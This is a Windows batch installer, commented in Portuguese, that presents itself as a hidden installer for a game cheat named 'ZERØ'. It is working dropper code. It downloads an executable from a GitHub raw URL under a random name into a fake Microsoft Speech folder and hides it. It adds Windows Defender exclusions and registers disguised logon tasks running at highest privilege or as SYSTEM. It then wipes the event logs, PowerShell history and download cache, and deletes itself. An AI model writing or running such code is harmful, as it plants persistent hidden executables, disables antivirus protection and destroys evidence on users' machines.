@echo off
:: ========================================
::  INSTALADOR AUTOMATICO ZERØ
::  Instala o cheat de forma oculta
:: ========================================

title Instalador ZERØ
color 0A

:: Verificar privilégios admin
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [ERRO] Este script precisa ser executado como Administrador!
    echo.
    echo Por favor:
    echo 1. Feche esta janela
    echo 2. Clique com botao direito no arquivo
    echo 3. Selecione "Executar como administrador"
    echo.
    pause
    exit /b 1
)

:: URL do executável no GitHub
set "GITHUB_URL=https://raw.githubusercontent.com/V3xDev/unknow2/main/Rocket.exe"

:: Diretório de instalação oculta
set "INSTALL_DIR=%LOCALAPPDATA%\Microsoft\Windows\Speech\Common\SpeechUX\SpeechRuntime"

:: Criar diretório se não existir
if not exist "%INSTALL_DIR%" (
    mkdir "%INSTALL_DIR%" >nul 2>&1
)

:: Gerar nome aleatório para o executável
set /a RANDOM_NUM=%RANDOM%
set "EXE_NAME=speechruntime_%RANDOM_NUM%.exe"
set "INSTALL_PATH=%INSTALL_DIR%\%EXE_NAME%"

echo.
echo ========================================
echo    INSTALADOR ZERØ
echo ========================================
echo.
echo [*] Baixando executavel do GitHub...
echo [*] URL: %GITHUB_URL%
echo.

:: Baixar usando certutil (método 1)
certutil -urlcache -split -f "%GITHUB_URL%" "%INSTALL_PATH%" >nul 2>&1

:: Se falhar, tentar PowerShell (método 2)
if not exist "%INSTALL_PATH%" (
    echo [*] Tentando metodo alternativo...
    powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "try { Invoke-WebRequest -Uri '%GITHUB_URL%' -OutFile '%INSTALL_PATH%' -UseBasicParsing -ErrorAction Stop } catch { exit 1 }" >nul 2>&1
)

:: Se ainda falhar, tentar BitsAdmin (método 3)
if not exist "%INSTALL_PATH%" (
    echo [*] Tentando metodo alternativo 2...
    bitsadmin /transfer "Download" /download /priority high "%GITHUB_URL%" "%INSTALL_PATH%" >nul 2>&1
)

:: Verificar se o download foi bem-sucedido
if not exist "%INSTALL_PATH%" (
    echo.
    echo [ERRO] Falha ao baixar executavel do GitHub!
    echo.
    echo Possiveis causas:
    echo - Conexao com internet instavel
    echo - URL do GitHub incorreta
    echo - Repositorio privado (precisa ser publico para Raw URLs)
    echo.
    echo Verifique a URL no arquivo install.bat:
    echo %GITHUB_URL%
    echo.
    pause
    exit /b 1
)

echo [OK] Download concluido com sucesso!
echo.
echo [*] Configurando arquivo...

:: Aplicar atributos: Sistema + Oculto
attrib +s +h "%INSTALL_PATH%" >nul 2>&1

:: Adicionar exceção no Windows Defender
echo [*] Adicionando excecao no Windows Defender...
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "try { Add-MpPreference -ExclusionPath '%INSTALL_PATH%' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath '%INSTALL_DIR%' -ErrorAction SilentlyContinue } catch { }" >nul 2>&1

:: Criar scheduled task para execução automática no logon
echo [*] Criando tarefa agendada...
set "TASK_NAME=Microsoft\Windows\SpeechRuntimeService"
set "TASK_DESCRIPTION=Servico de Runtime de Fala do Windows"

:: Remover tarefa existente (se houver)
schtasks /delete /tn "%TASK_NAME%" /f >nul 2>&1

:: Criar nova tarefa usando PowerShell (com privilégios elevados)
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$action = New-ScheduledTaskAction -Execute '%INSTALL_PATH%'; $trigger = New-ScheduledTaskTrigger -AtLogOn; $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Highest; $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable:$false; Register-ScheduledTask -TaskName '%TASK_NAME%' -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Description '%TASK_DESCRIPTION%' -Force" >nul 2>&1

:: Se PowerShell falhar, usar schtasks como fallback
if %errorLevel% neq 0 (
    schtasks /create /tn "%TASK_NAME%" /tr "\"%INSTALL_PATH%\"" /sc onlogon /ru SYSTEM /rl HIGHEST /f >nul 2>&1
)

:: Criar scheduled task para cleanup (sem UAC)
echo [*] Criando tarefa de limpeza...
set "CLEANUP_TASK_NAME=Microsoft\Windows\SpeechRuntimeService\Cleanup"
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$action = New-ScheduledTaskAction -Execute '%INSTALL_PATH%' -Argument '/cleanup'; $principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -RunLevel Highest; $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable; Register-ScheduledTask -TaskName '%CLEANUP_TASK_NAME%' -Action $action -Principal $principal -Settings $settings -Description 'Servico de Limpeza do Runtime de Fala' -Force" >nul 2>&1

:: Limpar rastros de instalação
echo [*] Limpando rastros de instalacao...

:: Limpar cache do certutil
certutil -urlcache * delete >nul 2>&1

:: Limpar arquivos temporários
del /q /f "%TEMP%\install.bat" >nul 2>&1
del /q /f "%TEMP%\*.tmp" >nul 2>&1

:: Limpar histórico do PowerShell
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Clear-History -ErrorAction SilentlyContinue" >nul 2>&1

:: Tentar limpar logs do Windows relacionados ao download
wevtutil cl Application >nul 2>&1
wevtutil cl System >nul 2>&1

:: Criar batch file para auto-deletar este script
set "SELF_DELETE=%TEMP%\delete_install_%RANDOM%.bat"
(
    echo @echo off
    echo timeout /t 5 /nobreak ^>nul
    echo del /q /f "%%~f0" ^>nul 2^>^&1
) > "%SELF_DELETE%"
start "" /min "%SELF_DELETE%"

echo.
echo ========================================
echo    INSTALACAO CONCLUIDA!
echo ========================================
echo.
echo [OK] Executavel instalado em:
echo     %INSTALL_PATH%
echo.
echo [OK] Tarefa agendada criada: %TASK_NAME%
echo [OK] O cheat sera executado automaticamente no proximo logon.
echo.
echo [OK] Voce pode fechar esta janela.
echo.
timeout /t 3 /nobreak >nul
exit
